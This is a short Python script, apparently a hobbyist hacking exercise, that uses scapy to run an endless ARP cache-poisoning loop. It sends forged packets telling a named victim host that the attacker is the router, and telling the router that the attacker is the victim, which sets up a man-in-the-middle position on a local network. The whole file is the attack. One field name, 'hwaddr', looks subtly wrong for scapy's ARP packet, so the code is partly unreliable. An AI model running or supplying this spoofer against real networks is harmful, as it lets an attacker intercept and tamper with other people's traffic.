import scapy.all as scap

while True:
    packet = scap.ARP(op=1, pdst="192.168.111.157", hwaddr="00:0c:29:1e:76:af", psrc="192.168.111.2")
    scap.send(packet)  # Packet telling the Victim (with ip address 192.168.111.157) that the hacker is the Router.

    packet = scap.ARP(op=1, pdst="192.168.111.2", hwaddr="00:50:56:e7:86:57", psrc="192.168.111.157")
    scap.send(packet)  # Packet telling the Router (with ip address 192.168.111.2) that the hacker is the Victim.
